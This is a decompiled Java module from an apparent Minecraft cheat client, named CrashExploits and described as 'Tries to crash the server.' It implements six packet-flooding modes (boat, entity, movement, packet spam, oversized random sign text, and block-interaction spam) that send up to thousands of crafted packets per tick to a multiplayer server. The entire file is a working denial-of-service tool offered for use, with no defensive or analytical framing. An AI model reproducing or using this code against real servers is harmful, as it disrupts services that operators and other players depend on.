/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  net.minecraft.class_1268
 *  net.minecraft.class_1297
 *  net.minecraft.class_1690
 *  net.minecraft.class_2350
 *  net.minecraft.class_243
 *  net.minecraft.class_2596
 *  net.minecraft.class_2827
 *  net.minecraft.class_2828
 *  net.minecraft.class_2828$class_2830
 *  net.minecraft.class_2833
 *  net.minecraft.class_2836
 *  net.minecraft.class_2877
 *  net.minecraft.class_2885
 *  net.minecraft.class_2886
 *  net.minecraft.class_3965
 */
package minegame159.meteorclient.systems.modules.bedtrap;

import java.util.Objects;
import java.util.Random;
import meteordevelopment.orbit.EventHandler;
import minegame159.meteorclient.events.game.GameLeftEvent;
import minegame159.meteorclient.events.world.PlaySoundEvent;
import minegame159.meteorclient.events.world.TickEvent;
import minegame159.meteorclient.settings.BoolSetting;
import minegame159.meteorclient.settings.DoubleSetting;
import minegame159.meteorclient.settings.EnumSetting;
import minegame159.meteorclient.settings.IntSetting;
import minegame159.meteorclient.settings.Setting;
import minegame159.meteorclient.settings.SettingGroup;
import minegame159.meteorclient.systems.modules.Categories;
import minegame159.meteorclient.systems.modules.Module;
import minegame159.meteorclient.utils.player.ChatUtils;
import net.minecraft.class_1268;
import net.minecraft.class_1297;
import net.minecraft.class_1690;
import net.minecraft.class_2350;
import net.minecraft.class_243;
import net.minecraft.class_2596;
import net.minecraft.class_2827;
import net.minecraft.class_2828;
import net.minecraft.class_2833;
import net.minecraft.class_2836;
import net.minecraft.class_2877;
import net.minecraft.class_2885;
import net.minecraft.class_2886;
import net.minecraft.class_3965;

public class CrashExploits
extends Module {
    private final Setting<Double> speed;
    private final Setting<Mode> CMode;
    private final Setting<Integer> amount;
    private final Setting<Boolean> autoDisable;
    class_2836 boat_packet;
    private final SettingGroup sgGeneral;
    private final Setting<Boolean> noSound;
    static final boolean $assertionsDisabled = !CrashExploits.class.desiredAssertionStatus();

    @EventHandler
    private void onGameLeft(GameLeftEvent gameLeftEvent) {
        if (!this.autoDisable.get().booleanValue()) {
            return;
        }
        this.toggle();
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent playSoundEvent) {
        if (this.CMode.get() == Mode.Boat && this.noSound.get().booleanValue() && playSoundEvent.sound.method_4775().toString().equals("minecraft:entity.boat.paddle_land") || playSoundEvent.sound.method_4775().toString().equals("minecraft:entity.boat.paddle_water")) {
            playSoundEvent.cancel();
        }
    }

    public static double rndD(double d) {
        Random random = new Random();
        return random.nextDouble() * d;
    }

    public CrashExploits() {
        super(Categories.BedTrap, "crash-exploits", "Tries to crash the server.");
        this.sgGeneral = this.settings.getDefaultGroup();
        this.CMode = this.sgGeneral.add(new EnumSetting.Builder().name("Mode").description("Crash methods.").defaultValue(Mode.Boat).build());
        this.speed = this.sgGeneral.add(new DoubleSetting.Builder().name("speed").description("Speed in blocks per second. Only for Entity mode.").defaultValue(1337.0).min(1.0).sliderMax(10000.0).build());
        this.amount = this.sgGeneral.add(new IntSetting.Builder().name("packets").description("How many packets to send to the server per tick. Only for Boat, Entity, Movement, PacketSpam, Sign, UnnamedCrash mode.").defaultValue(100).min(1).sliderMax(10000).build());
        this.noSound = this.sgGeneral.add(new BoolSetting.Builder().name("no-sound").description("Blocks the noisy paddle sounds. Only for Boat mode.").defaultValue(false).build());
        this.autoDisable = this.sgGeneral.add(new BoolSetting.Builder().name("auto-disable").description("Disables module on kick.").defaultValue(false).build());
        this.boat_packet = new class_2836(true, true);
    }

    public double getDistributedRandom(double d) {
        return CrashExploits.rndD(d) - d / 2.0;
    }

    @Override
    public void onActivate() {
        if (this.CMode.get() == Mode.Entity) {
            if (!$assertionsDisabled && this.mc.field_1724 == null) {
                throw new AssertionError();
            }
            if (this.mc.field_1724.method_5854() == null) {
                ChatUtils.info("You must be riding an entity - disabling.", new Object[0]);
                this.toggle();
            }
        }
    }

    public static String rndBinStr(int n) {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < n; ++i) {
            stringBuilder.append((char)new Random().nextInt(65535));
            if (1 > -1) continue;
            return null;
        }
        return String.valueOf(stringBuilder);
    }

    @EventHandler
    private void onTick(TickEvent.Post post) {
        class_2833 class_28332;
        int n;
        if (!$assertionsDisabled && this.mc.field_1724 == null) {
            throw new AssertionError();
        }
        class_1297 class_12972 = this.mc.field_1724.method_5854();
        class_1297 class_12973 = this.mc.field_1724.method_5854();
        if (this.CMode.get() == Mode.Boat) {
            if (!(class_12973 instanceof class_1690)) {
                ChatUtils.info("You must be in a boat - disabling.", new Object[0]);
                this.toggle();
                return;
            }
            for (n = 0; n < this.amount.get(); ++n) {
                Objects.requireNonNull(this.mc.method_1562()).method_2883((class_2596)this.boat_packet);
                if (null == null) continue;
                return;
            }
        }
        if (this.CMode.get() == Mode.Entity) {
            for (n = 0; n < this.amount.get(); ++n) {
                if (!$assertionsDisabled && class_12972 == null) {
                    throw new AssertionError();
                }
                class_243 class_2432 = class_12972.method_19538();
                class_12972.method_5814(class_2432.field_1352, class_2432.field_1351 + this.speed.get(), class_2432.field_1350);
                class_28332 = new class_2833(class_12972);
                Objects.requireNonNull(this.mc.method_1562()).method_2883((class_2596)class_28332);
                if (0 >= 0) continue;
                return;
            }
        }
        if (this.CMode.get() == Mode.Movement) {
            if (this.mc.method_1562() == null) {
                return;
            }
            try {
                class_243 class_2433 = this.mc.field_1724.method_19538();
                for (int i = 0; i < this.amount.get(); ++i) {
                    class_28332 = new class_2828.class_2830(class_2433.field_1352 + this.getDistributedRandom(1.0), class_2433.field_1351 + this.getDistributedRandom(1.0), class_2433.field_1350 + this.getDistributedRandom(1.0), (float)CrashExploits.rndD(90.0), (float)CrashExploits.rndD(180.0), true);
                    this.mc.method_1562().method_2883((class_2596)class_28332);
                    if (null == null) continue;
                    return;
                }
            }
            catch (Exception exception) {
                ChatUtils.info("Stopping movement crash because an error occurred!", new Object[0]);
                this.toggle();
            }
        }
        if (this.CMode.get() == Mode.PacketSpam) {
            for (int i = 0; i < this.amount.get(); ++i) {
                this.mc.method_1562().method_2883((class_2596)new class_2828(Math.random() >= 0.5));
                this.mc.method_1562().method_2883((class_2596)new class_2827((long)((int)(Math.random() * 8.0))));
            }
        }
        if (this.CMode.get() == Mode.Sign) {
            for (int i = 0; i < this.amount.get(); ++i) {
                if (!$assertionsDisabled && this.mc.field_1724 == null) {
                    throw new AssertionError();
                }
                class_2877 class_28772 = new class_2877(this.mc.field_1724.method_24515(), CrashExploits.rndBinStr(598), CrashExploits.rndBinStr(598), CrashExploits.rndBinStr(598), CrashExploits.rndBinStr(598));
                Objects.requireNonNull(this.mc.method_1562()).method_2883((class_2596)class_28772);
                if (-3 < 0) continue;
                return;
            }
        }
        if (this.CMode.get() == Mode.UnnamedCrash) {
            if (this.mc.method_1562() == null) {
                return;
            }
            for (int i = 0; i < this.amount.get(); ++i) {
                if (!$assertionsDisabled && this.mc.field_1724 == null) {
                    throw new AssertionError();
                }
                class_3965 class_39652 = new class_3965(new class_243(0.5, 0.5, 0.5), class_2350.field_11033, this.mc.field_1724.method_24515(), false);
                class_28332 = new class_2886(class_1268.field_5808);
                class_2885 class_28852 = new class_2885(class_1268.field_5808, class_39652);
                this.mc.method_1562().method_2883((class_2596)class_28332);
                this.mc.method_1562().method_2883((class_2596)class_28852);
                if (-1 <= 0) continue;
                return;
            }
        }
    }

    public static enum Mode {
        Boat,
        Entity,
        Movement,
        PacketSpam,
        Sign,
        UnnamedCrash;

    }
}

